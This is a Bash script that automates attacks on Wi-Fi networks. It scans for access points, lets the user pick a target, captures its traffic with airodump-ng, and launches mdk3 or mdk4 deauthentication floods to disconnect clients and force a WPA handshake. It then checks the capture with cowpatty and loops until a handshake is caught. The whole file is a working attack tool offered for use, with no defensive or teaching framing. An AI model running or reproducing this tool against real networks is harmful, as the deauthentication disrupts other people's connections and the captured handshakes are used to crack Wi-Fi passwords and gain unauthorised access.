#!/bin/bash
#
#********************************************************************
#Author:                QianSong
#QQ:                    1725099638
#Date:                  2022-09-13
#FileName：             handshakes.sh
#URL:                   https://github.com/QianSong1
#Description：          The handshake wifi cap info script
#Copyright (C):         QianSong 2022 All rights reserved
#********************************************************************

#ding yi var
work_dir=$(dirname $(realpath $0))/temp
result_dir=$(dirname $(realpath $0))/result

#pan duan shi fou root yon hu yun xing
if [ "${UID}" != "0" ]; then
	echo -e "\033[31mPermission denied, please run this script as root.\033[0m"
	exit 1
fi

#an zhuang yi lai ruan jian function
install_dependent_software() {
apt update
if [ $? -ne 0 ]; then
	echo -e "\033[31mnetwork error\033[0m"
	exit 2
fi
apt install $1 -y
if [ $? -ne 0 ]; then
	echo -e "\033[31mnetwork error\033[0m"
	exit 3
fi
}

#pan  duan  shi  fou  an zhuang  le  yi  lai  ruan  jian
for i in mdk3 mdk4 airmon-ng airodump-ng xterm dos2unix cowpatty
do
	type ${i} >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "${i}.....................\033[32mOK\033[0m"
	else
		echo -e "${i}.....................\033[33mInstalling\033[0m"
		case ${i} in
			mdk3)
				install_dependent_software mdk3
				;;
			mdk4)
				install_dependent_software mdk4
				;;
			airmon-ng)
				install_dependent_software aircrack-ng
				;;
			airodump-ng)
				install_dependent_software aircrack-ng
				;;
			xterm)
				install_dependent_software xterm
				;;
			dos2unix)
				install_dependent_software dos2unix
				;;
			cowpatty)
				install_dependent_software cowpatty
				;;
			*)
				echo -e "\033[31mUknown error..\033[0m"
				exit 4
				;;
		esac
	fi
	sleep 0.1
done

#pan duan work_dir shi  fou  cun  zai
if [ ! -d ${work_dir} ];then
	mkdir ${work_dir} -p
fi
#pan duan result_dir shi  fou  cun  zai
if [ ! -d ${result_dir} ];then
	mkdir ${result_dir} -p
fi

#======================xian shi  wlan0 info function============================
function show_interface_list() {
#bao cun list to file
rm -rf ${work_dir}/interface_list.txt >/dev/null 2>&1
if_list=$(ip a|egrep "^[0-9]+" |awk -F ":" '{print $2}'|awk '{print $1}'|egrep -v "^lo$")
local i=1
for if_name in ${if_list}
do
	if_chipest=$(airmon-ng|awk -v if_name=${if_name} '{if ($2==if_name) {print $3,$4,$5,$6,$7,$8,$9,$10,$11}}')
	#if_suport_band=
	echo -e "${i}., ${if_name}, driver&chipest: ${if_chipest}" >> ${work_dir}/interface_list.txt
	let i++
done
#du qu list from file
while IFS=, read -r if_num if_name if_chipest; do
	echo -e "\033[32m${if_num} ${if_name}\033[0m ${if_chipest}"
done < "${work_dir}/interface_list.txt"
}

#=======================select wlan card=======================================
clear
show_interface_list
echo -ne "\033[33mPlease select one interface: \033[0m"
read inface_num
while true
do
	if [ -z "${inface_num}" ] || [ "${inface_num}" == "" ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num can not be null\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	elif [ "${inface_num}" == "0" ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num can not be 0\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	elif [[ ! "${inface_num}" =~ ^[0-9]+$ ]]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num must be a number type\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	elif [ "${inface_num}" -gt $(cat "${work_dir}/interface_list.txt"|wc -l) ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num must be less than the interface list total num\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	else
		break
	fi
done

#=====================shu chu ni  de  xuan  zhe  jie  guo====================
wlan_card=$(cat "${work_dir}/interface_list.txt"|awk -F "," "NR==${inface_num}"'{print $2}'|awk '{print $1}')
airmon-ng | grep "${wlan_card}" >/dev/null 2>&1
card_check_status=$?
if [ ${card_check_status} -eq 0 ]; then
	echo -e "\033[35mYour selected interface is\033[0m \033[32m[${wlan_card}]\033[0m \033[35mbe suported\033[0m"
else
	echo -e "\033[35mYour selected interface is\033[0m \033[32m[${wlan_card}]\033[0m \033[31mnot be suported\033[0m"
	exit 5
fi
ip a |grep "${wlan_card}" >/dev/null 2>&1
interface_status=$?

#pan duan wang ka  shi  fou  kai qi jian  ting
if [ ${interface_status} -eq 0 ];then
	echo "start interface to monintor mode..."
	airmon-ng check kill
	check_kill=$?
	ip link set ${wlan_card} down
	if_down=$?
	iw dev ${wlan_card} set type monitor
	if_monitor=$?
	ip link set ${wlan_card} up
	if_up=$?
	if [ ${check_kill} -eq 0 ] && [ ${if_down} -eq 0 ] && [ ${if_monitor} -eq 0 ] && [ ${if_up} -eq 0 ]; then
		echo -e "\033[32mSUCESS..\033[0m"
	else
		echo -e "\033[31mFALED..\033[0m"
		exit 6
	fi
else
	echo -e "\033[33mThere is no such device ${wlan_card}, please make sure that you plug in the device and work normally\033[0m"
	exit 7
fi

#xuan zhe gon ji mode
handshake_menu() {
cat <<EOF
Select one type what you want to handshake
************************************
1.        2.4G                     *
2.        5G                       *
************************************
EOF
}

#sao miao all ap function
scan_all_ap() {
for i in 1
do
	rm -rf ${work_dir}/dump*
	sleep 3
	xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Scan all AP" -e airodump-ng ${wlan_card} --band $1 -w ${work_dir}/dump &
	echo $! >${work_dir}/airodump-ng.pid
	target_pid=$(cat ${work_dir}/airodump-ng.pid)
        pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
        ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
        while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
	do
		target_pid=$(cat ${work_dir}/airodump-ng.pid)
	       	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	       	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
		sleep 1
	done
	sleep 3
done
}

#xian shi sao miao jie guo function
display_result_info() {
IFS=$'\n'
a=1
for i in $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep --text -v "Station MAC"|egrep --text -v "SSID,"|egrep --text -v "^$")
do
	temp_mac=$(echo ${i}|awk -F "," '{print $1}')
	cat ${work_dir}/dump-01.csv|sed -e:b -e '$!{N;1,80000bb' -e\} -e '/\n.*Station MAC/!P;D'|egrep --text -v "Station MAC"|egrep --text -v "^$"|grep --text ${temp_mac} >/dev/null 2>&1
	client_stat=$?
	if [ "${client_stat}" == "0" ]; then
		echo -e "\033[33m[$a]\033[0m \033[32m$i\033[0m"
	else
		echo -e "\033[33m[$a]\033[0m $i"
	fi
	let a++
done
}

#handshake 2.4g and 5g function
handshake_bga() {
#shao  miao   wifi  into  text wifi_info.txt
echo "starting scan wifi info into ${work_dir}/dump-01.csv...."

#shu chu cao zuo ti shi info
echo -e "\n"
echo -e "\033[33m提示：当目标WiFi出现了，请手动关掉扫描窗口进入下一步！\033[0m"
scan_all_ap $2

#xian shi sao  miao  jie  guo
clear
dos2unix ${work_dir}/dump-01.csv >/dev/null 2>&1
display_result_info

#xuan zhe yi  ge  xin hao
read -p "Select one AP what you want to handshake [num]: " ap_num
while true
do
	if [ -z ${ap_num} ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	elif [[ ! ${ap_num} =~ ^[0-9]+$ ]]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	elif [ ${ap_num} -gt $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep --text -v "Station MAC"|egrep --text -v "SSID,"|egrep --text -v "^$"|wc -l) ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num con't be great of total number for ap list!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	elif [ ${ap_num} -eq 0 ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num is must be great of 0!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	else
		break
	fi
done

#ding yi mu biao  AP mac and xin dao
target_mac=$(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep --text -v "Station MAC"|egrep --text -v "SSID,"|egrep --text -v "^$"|awk -F "," "NR==${ap_num}"'{print $1}')
if [ -z ${target_mac} ] || [ "${target_mac}" == "" ]; then
	echo -e "\033[31mThe target ap mac is null ,now program is exit.\033[0m"
	exit 8
fi
target_ap_name=$(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|grep --text "${target_mac}"|awk -F "," '{if (NF>1) {print $(NF-1)}}'|awk '{print $1}')
cur_channel=$(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|grep --text "${target_mac}"|awk '{print $6}'|awk -F "," '{print $1}'|egrep -v "^0$"|egrep -v "-"|egrep -v "[0-9]+e"|sort|uniq -c|sort -nk 1|tail -n 1|awk "NR==1"'{print $2}')

#kai qi  zhua  bao  xterm
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[35mThe handshake program xterm have started.\033[0m"
	sleep 1
	for i in 1
	do
		rm -rf ${result_dir}/${target_mac//:/-}*
		sleep 3
		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
		echo $! >${work_dir}/airodump-ng.pid
		sleep 3
	done
else
	echo -e "\033[35mThe handshake program xterm have started.\033[0m"
	sleep 1
	for i in 1
	do
		rm -rf ${result_dir}/${target_ap_name}-${target_mac//:/-}*
		sleep 3
		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_ap_name}-${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
		echo $! >${work_dir}/airodump-ng.pid
		sleep 3
	done
fi

#kai qi gon ji mdk xterm
echo  "${target_mac}" >${work_dir}/black_mac_list.txt
echo  "" >>${work_dir}/black_mac_list.txt
xterm -geometry "71+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e $1 ${wlan_card} d -b ${work_dir}/black_mac_list.txt -c ${cur_channel} &
echo $! >${work_dir}/mdk.pid

#shu chu cao zuo ti shi info
echo -e "\n"
echo -e "\033[33m提示：当目标WiFi握手包出现了，请手动关掉抓包窗口进入下一步！\033[0m"

#guan bi handshake pid de jian ting program
i=1
target_pid=$(cat ${work_dir}/airodump-ng.pid)
pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
do
	target_pid=$(cat ${work_dir}/airodump-ng.pid)
	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	echo -n "Now ${i} seconds has passd.."
	echo -ne "\r\r"
	sleep 1
	let i+=1
done
sleep 3

#guan bi gon ji xterm
echo -e "\033[32mClose the mdk attack xterm...\033[0m"
cat ${work_dir}/mdk.pid|xargs -i kill {} >/dev/null 2>&1
target_pid=$(cat ${work_dir}/mdk.pid)
pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
do
	target_pid=$(cat ${work_dir}/mdk.pid)
	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	sleep 1
done
sleep 3
}

#check handshake fuction
handshake_check() {
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
	sleep 3
	cowpatty -c -r ${result_dir}/${target_mac//:/-}-01.cap >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "\033[32mThe target handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[32mcheck sucessfully \033[0m"
		return 0
	else
		echo -e "\033[31mThe target handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[31mcheck faild \033[0m"
		return 1
	fi
else
	echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
	sleep 3
	cowpatty -c -r ${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "\033[32mThe target handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[32mcheck sucessfully \033[0m"
		return 0
	else
		echo -e "\033[31mThe target handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[31mcheck faild \033[0m"
		return 1
	fi
fi
}

#xian shi jie guo info function
display_cap_location() {
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_mac//:/-}-01.cap] \033[0m"
	exit 0
else
	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap] \033[0m"
	exit 0
fi
}

#function ru kou
while true
do
	handshake_menu
	read -p "Please select: " hand_type
	case ${hand_type} in
		1)
			handshake_bga mdk3 bg
			handshake_check
			exit_code=$?
			while [ ${exit_code} -ne 0 ]
			do
				echo -e "\033[35mRestart handshake program and rechecking....\033[0m"
				sleep 3
				handshake_bga mdk3 bg
				handshake_check
				exit_code=$?
			done
			display_cap_location
			;;
		2)
			handshake_bga mdk4 a
			handshake_check
			exit_code=$?
			while [ ${exit_code} -ne 0 ]
			do
				echo -e "\033[35Restart handshake program and rechecking....\033[0m"
				sleep 3
				handshake_bga mdk4 a
				handshake_check
				exit_code=$?
			done
			display_cap_location
			;;
		*)
			clear
			;;
	esac
done
